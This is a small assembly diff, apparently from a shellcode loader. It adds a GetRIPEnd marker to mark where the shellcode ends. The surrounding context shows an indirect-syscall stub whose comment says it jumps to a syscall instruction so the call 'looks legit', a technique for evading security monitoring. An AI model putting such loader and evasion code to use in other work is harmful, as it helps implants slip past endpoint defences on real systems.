@@ -3,6 +3,7 @@ extern Entry
 
 global Start
 global GetRIP
+global GetRIPEnd
 global HellHall
 global SetConfig
 global KaynCaller
@@ -68,4 +69,10 @@ section .text$C
         mov r10, rcx	
         jmp r11		; JUMPING TO A ADDRESS WHERE WE HAVE `syscall` INSTRUCTION - SO THAT IT LOOKS LEGIT
         ret
+    ret
+
+; Random function at the end (5 bytes long) to determine the end of the shellcode
+section .text$END
+    GetRIPEnd:
+        call    retptr
     ret
